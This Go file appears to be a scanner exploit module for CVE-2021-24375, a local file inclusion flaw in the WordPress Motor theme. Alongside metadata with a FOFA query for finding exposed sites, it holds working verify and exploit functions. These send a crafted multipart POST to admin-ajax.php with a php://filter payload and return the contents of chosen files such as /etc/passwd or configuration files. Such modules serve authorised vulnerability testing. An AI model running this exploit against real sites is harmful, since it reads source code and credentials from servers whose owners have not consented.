package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Theme Motor File Inclusion Vulnerability(CVE-2021-24375)",
    "Description": "<p>Motor is a professional WordPress WooCommerce Theme for dealers, retailers, shops and mechanics.</p><p>WordPress Motor  Theme &lt; 3.1.0 is vulnerable to Local File Inclusion.</p>",
    "Product": "wordpress-theme-motor",
    "Homepage": "https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946",
    "DisclosureDate": "2021-06-17",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/themes/motor\"",
    "GobyQuery": "body=\"wp-content/themes/motor\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946\">https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/d9518429-79d3-4b13-88ff-3722d05efa9f"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2021-24375"
    ],
    "CNNVD": [
        "CNNVD-202107-251"
    ],
    "CNVD": [
        "CNVD-2022-69135"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Motor 主题 admin-ajax.php 文件包含漏洞（CVE-2021-24375）",
            "Product": "wordpress-theme-motor",
            "Description": "<p>Motor 是一个专业的 WordPress WooCommerce 主题，适用于经销商、零售商、商店和机械师。</p><p>Motor &lt; 3.1.0版本存在文件包含漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946\">https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Motor &lt; 3.1.0版本存在文件包含漏洞，</span>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Theme Motor File Inclusion Vulnerability(CVE-2021-24375)",
            "Product": "wordpress-theme-motor",
            "Description": "<p>Motor is a professional WordPress WooCommerce Theme for dealers, retailers, shops and mechanics.</p><p>WordPress Motor&nbsp;&nbsp;Theme &lt; 3.1.0 is vulnerable to Local File Inclusion.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946\">https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin-ajax.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------1699260943")
			cfg.Data = "----------1699260943\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"action\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "motor_load_more\r\n"
			cfg.Data += "----------1699260943\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "php://filter/convert.base64-encode/resource=index.php\r\n"
			cfg.Data += "----------1699260943--"
			if response, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				base64_str := strings.Replace(response.RawBody, "\\", "", -1)
				decoded, _ := base64.StdEncoding.DecodeString(base64_str)
				decodestr_exp := string(decoded)
				if strings.Contains(decodestr_exp, "admin_email_remind_later") {
					return true
				} else {
					return false
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			cfg := httpclient.NewPostRequestConfig("/wp-admin/admin-ajax.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------1699260943")
			cfg.Data = "----------1699260943\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"action\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += "motor_load_more\r\n"
			cfg.Data += "----------1699260943\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file\"\r\n"
			cfg.Data += "\r\n"
			cfg.Data += fmt.Sprintf("php://filter/convert.base64-encode/resource=%s\r\n", filePath)
			cfg.Data += "----------1699260943--"
			if response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				base64_str := strings.Replace(response.RawBody, "\\", "", -1)
				decoded, _ := base64.StdEncoding.DecodeString(base64_str)
				decodestr_exp := string(decoded)
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output += decodestr_exp
			}
			return expResult
		},
	))
}
